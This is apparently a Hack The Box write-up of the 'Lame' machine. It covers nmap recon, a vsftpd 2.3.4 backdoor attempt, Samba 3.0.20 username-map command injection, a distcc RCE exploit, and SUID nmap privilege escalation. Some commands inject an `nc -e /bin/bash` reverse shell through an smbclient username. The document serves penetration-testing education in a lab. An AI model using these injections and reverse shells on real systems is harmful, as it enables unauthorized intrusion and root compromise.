---
title: Lame - Hack The Box
categories: [Linux, FTP, Samba, SMB, Server Message Block, distcc, vsftpd, vsf_sysutil_extra(), SMBMap, smbclient, username map script, Python, pysmb, Reverse Shell, SUID, Autopwn]
published: true
lang: en
---

![Info Card](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/1.png){:class="blog-image" onclick="expandImage(this)"}

Today we will be solving _Hack The Box's_ _Lame_ machine. It is an easy-level _Linux_ machine, both in terms of exploitation and privilege escalation.

This machine allows us to exploit it through two potential paths, one of which requires post-exploitation. Despite its low difficulty, there are multiple methods to perform the same exploitation, making it great for learning different approaches to achieve the same process.

### [](#header-3)Reconnaissance Phase

First, we’re going to launch an _ICMP traceroute_ to check if the machine is active.

```
ping -c 1 10.10.10.3
```

![2](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/2.png){:class="blog-image" onclick="expandImage(this)"}

Once we verify that the machine is active (as it returns a response), we can also determine what type of machine we are dealing with based on the _TTL_ value; in this case, the machine’s _TTL_ value is `63`, so we can infer that we are dealing with a _Linux_ machine. Remember, some of the reference values are as follows:

| Operating System (OS)  | TTL |
|:-----------------------|:----|
| Linux                  | 64  |
| Windows                | 128 |
| Solaris                | 254 | 

If we notice, in this case, the _TTL_ value is `63` instead of `64` as indicated in the table above. This is because, in the _Hack The Box_ environment, we are not communicating directly with the target machine; instead, there is an intermediary node, which causes the _TTL_ to decrease by one unit.

```
ping -c 1 10.10.10.3 -R
``` 

![3](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/3b.png){:class="blog-image" onclick="expandImage(this)"}

Next, we will use the _Nmap_ tool to determine which ports are open, as well as identify the version and services running on the asset. To determine which ports are open, we can do the following:

```bash
nmap -p- --open -T5 -v -n 10.10.10.3
```

If the scan takes too long to complete, we have this alternative:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.3
```

Below is an explanation of the parameters used in the port scan with _Nmap_:

| Parameter | Explanation |
|:----------|:------------|
| \-p\- | Scans the entire range of ports (65535 in total) |
| \-\-open | Shows all ports that are open (or possibly open) |
| \-T5 | The timing template allows us to speed up our scan; this value can range from 0 to 5. Note that the higher the value of the template, the more "noise" we generate, but that’s okay, right? After all, we’re practicing in a controlled environment, and here we are all `White Hat` | 
| \-v | _Verbose_, reports findings to the console |
| \-n | Do not apply _DNS resolution_ |
| \-sS | _TCP SYN_ scan |
| \-min-rate | Send packets no slower than \<value\> per second |
| \-vvv | Triple _verbose_, to get more information in the console |
| \-Pn | Do not apply _host discovery_ |

Once we have detected the open ports on the asset, we can move on to determine the version and services running on these ports.

```bash
nmap -sC -sV -p 21,22,139,445,3632 10.10.10.3
```

Below is an explanation of the parameters used in the version and service scan with _Nmap_:

| Parameter | Explanation |
|:----------|:------------|
| \-sC | Basic enumeration scripts |
| \-sV | Version and services running on the found ports |
| \-p | Specify which ports we want to analyze (those found open in the previous step) |

Based on the information reported by _Nmap_, we can see that the target machine has open ports related to `FTP` (File Transfer Protocol), `SMB` (Server Message Block)  and `distcc`.

### [](#header-3)Exploitation Phase - Samba

The first thing we can do is enumerate the `FTP` service. For this, we will use a _null session_, as we do not have credentials; however, we will not find anything.

```bash
ftp anonymous@10.10.10.3
```

![4](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/4.png){:class="blog-image" onclick="expandImage(this)"}

Next, we can analyze our _Nmap_ scan, where we observe that the `FTP` server we are facing is `vsftpd`, specifically version `2.3.4`. If we do a bit of research, we will discover that this version has a vulnerability where a backdoor was introduced into the source code. This vulnerability added a conditional during authentication that looked for the characters "_:)_" (a smiley face) at the end of the username, and if found, it would execute an additional function: _vsf_sysutil_extra()_. This function would open a TCP socket on port `6200`, which, upon receiving a connection, would launch a shell. You can find more details about this vulnerability in [this article](https://westoahu.hawaii.edu/cyber/forensics-weekly-executive-summmaries/8424-2/). Therefore, we can attempt to exploit this vulnerability.

The first thing we will do is connect to the `FTP` service using _Telnet_:

```bash
telnet 10.10.10.3 21
```

Next, we will enter any username followed by “_:)_” and any password:

```bash
USER user:)
PASS p@$$w0rd!
```

Then, we can suspend the _Telnet_ console using `Ctrl + ]`. Afterward, we will attempt to connect to the target machine on port `6200` using _Netcat_:

```bash
nc 10.10.10.3 6200
```

![5](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/5.png){:class="blog-image" onclick="expandImage(this)"}

Shortly, we will realize that no connection is established, no matter how much we try or wait, so we can assume that the vulnerability on this machine has been patched. Therefore, we will move on to enumerating the next protocol identified during our _Nmap_ scan: `SMB`.

For this, we can use `SMBMap` or `smbclient` to check if the machine has shared network resources, again using a _null session_ since we do not have credentials:

```bash
smbmap -H 10.10.10.3
```

```bash
smbclient -N -L 10.10.10.3
```

![6](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/6.png){:class="blog-image" onclick="expandImage(this)"}

We see that we have read and write permissions on a share named `tmp`. We can list the contents of this share with any of the following commands:

```bash
smbmap -H 10.10.10.3 -r tmp
```

```bash
smbclient -N //10.10.10.3/tmp
```

However, we do not find anything of interest in this share.

![7](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/7.png){:class="blog-image" onclick="expandImage(this)"}

We can return to our _Nmap_ scan and notice that the `Samba` service is running version `3.0.20`. Therefore, we can investigate whether this version is vulnerable to any type of exploit. We can do this by searching online, for example, on _Exploit Database_, or directly from the console using `searchsploit`:

```bash
searchsploit samba 3.0.20
```

![8](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/8.png){:class="blog-image" onclick="expandImage(this)"}

We find a vulnerability that is exploited when the `username map script` configuration option is enabled (it is not enabled by default). By specifying a username containing _shell metacharacters_, it is possible to achieve remote command execution without prior authentication.

However, the exploit we found uses _Metasploit_, which does not align with our methodology. Nevertheless, by examining the script found with:

```bash
searchsploit -x 16320
```

![9](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/9.png){:class="blog-image" onclick="expandImage(this)"}

We can see that the exploit simply provides the command we want to execute as the username and an arbitrary string as the password. So, by understanding the script, we can manually replicate the same exploitation using `smbclient` without the need for automated scripts.

For this, we will set up a listener with _Netcat_ and execute the following command:

```bash
smbclient //10.10.10.3 -U "/=`nohup nc -e /bin/bash <ourIP> <anyPort>`"
```

![10](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/10.png){:class="blog-image" onclick="expandImage(this)"}

However, this will not yield the expected results, because although we get a shell, it connects back to our own attacking machine. Upon reviewing the exploit, we notice that it uses the `NTLMv1` protocol, so we can also try specifying this protocol in `smbclient` as follows:

```bash
smbclient //10.10.10.3 -U "/=`nohup nc -e /bin/bash <ourIP> <anyPort>`" --option='client min protocol=NT1'
```

![11](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/11.png){:class="blog-image" onclick="expandImage(this)"}

However, we will obtain the same result. At this point, we can try writing a similar script in _Python_ to see if we achieve a different outcome. For this, we will use the `pysmb` [documentation](https://pysmb.readthedocs.io/en/latest/api/smb_SMBConnection.html) to guide us in creating the script.

First, we install `pysmb`:

```bash
pip install pysmb
```

Upon reviewing the documentation, we see that the parameters _username_, _password_, _my_name_, and _remote_name_ are mandatory. However, we can leave _my_name_ and _remote_name_ empty. In the _username_ parameter, we will place our command to execute, and the _password_ field can also be left empty. The script would look something like this:

![12](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/12.png){:class="blog-image" onclick="expandImage(this)"}

Interestingly, we now manage to get a shell inside the target machine. This is likely because current versions of `smbclient` are configured to prevent such attacks. Nevertheless, we obtain access as `root`, which allows us to visualize both flags.

![13](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/13.png){:class="blog-image" onclick="expandImage(this)"}

However, I didn't want to sit idle, as my curiosity led me to keep trying this exploitation using `smbclient`. I found that if we connect to the `SMB` service using the same _null session_ and use the `logon` command to change the user, we can enter the command to execute directly in that field and thus exploit `SMB`.

![14](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/14.png){:class="blog-image" onclick="expandImage(this)"}

### [](#header-3)Exploitation Phase - distcc

The next exploitation path we can explore is through the `distcc` service. If we refer back to our _Nmap_ scan, we’ll see that the `distcc` service is running version `4.2.4`.

While there are scripts that use _Metasploit_ to exploit this vulnerability, we can also find an [exploit](https://gist.github.com/DarkCoderSc/4dbf6229a93e75c3bdf6b467e67a9855#file-distccd_rce_cve-2004-2687-py) by the user `DarkCoderSc` on GitHub that performs the exploitation manually.

This exploit provides us with remote command execution, and we can test it as follows:

```bash
python2 distccd_rce_CVE-2004-2687.py -t 10.10.10.3 -p 3632 -c 'ifconfig; whoami'
```

![15](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/15.png){:class="blog-image" onclick="expandImage(this)"}

Upon running the script, we confirm that we are inside the target machine. However, unlike the previous method, we now have access as the `daemon` user instead of _root_. This indicates that we will need to escalate privileges to fully compromise the system.

The next step will be to establish a reverse shell to our attacking machine, allowing us to visualize the first flag.

![16](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/16.png){:class="blog-image" onclick="expandImage(this)"}

### [](#header-3)Privilege Escalation

To perform this final phase, we can leverage binaries with misconfigured `SUID` permissions, which will allow us to escalate privileges. To list all binaries with `SUID` permissions on the machine, we can use the following commands:

```bash
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
```

```bash
find / -uid 0 -perm -4000 -type f 2>/dev/null
```

![17](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/17.png){:class="blog-image" onclick="expandImage(this)"}

The best way to abuse any binary is by referring to [GTFOBins](https://gtfobins.github.io/); this site teaches us how to exploit binaries with misconfigured _capabilities_, binaries that can be executed as _root_, and in this case, binaries with misconfigured `SUID` permissions.

The most interesting binary we found is `nmap`, which is running an old version. This version included an interactive mode that we can use to invoke a shell. Since `nmap` has `SUID` permissions, the shell will execute as the `root` user, allowing us to visualize the system's final flag.

![18](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/18.png){:class="blog-image" onclick="expandImage(this)"}

### [](#header-3)Autopwn Script

Additionally, I developed an _autopwn_ script available publicly on my GitHub [repository](https://github.com/MateoNitro550/HTB-Autopwn-Scripts/blob/main/Lame/autopwn_lame.py). This script automates the exploitation and privilege escalation on the machine, covering the techniques explained and serving as a guide to understand the exploitation process.

![19](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/19.png){:class="blog-image" onclick="expandImage(this)"}
